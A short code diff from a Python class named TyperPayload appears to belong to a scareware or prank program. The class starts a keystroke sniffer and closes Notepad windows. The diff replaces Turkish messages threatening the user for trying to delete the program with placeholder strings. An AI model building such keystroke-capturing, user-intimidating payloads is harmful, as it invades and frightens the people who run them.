@@ -81,17 +81,17 @@ class TyperPayload:
         self.key_sniffer.start()
         self._stages = {
             1:{
-                "real_msg":"Eğer beni silmeye çalışırsan bunun bedelini çok kötü ödersin haberin olsun tamam mı ? ",
-                "user_accept_msg":"tamam",
-                "user_not_accepted_msg":"Anla veya anlama umrumda da değil ben diyeceğimi dedim sonu kötü olur haberin olsun",
-                "user_accepted_msg":"Güzel öyle bende öyle düşünmüştüm bak aynı düşünceler sahibiz",
+                "real_msg":"accept_msg",
+                "user_accept_msg":"user_accecpted",
+                "user_not_accepted_msg":"user_not_accepted_",
+                "user_accepted_msg":"user_accepting_msg",
                 "on_close_function":self.close_all_notepad_windows
             },
             2:{
-                "real_msg":"Sana bunu yapmamanı söyledim sanırım biraz cezayı hak ettin :)",
-                "user_accept_msg":"evet",
-                "user_not_accepted_msg":"Artık ne yazsanda umrumda bile değil",
-                "user_accepted_msg":"Dediğim gibi iş işten geçti :)",
+                "real_msg":"accept_msg",
+                "user_accept_msg":"user_accecpted",
+                "user_not_accepted_msg":"user_not_accepted_",
+                "user_accepted_msg":"user_accepting_msg",
                 "on_close_function":self.close_all_notepad_windows
             }
         }
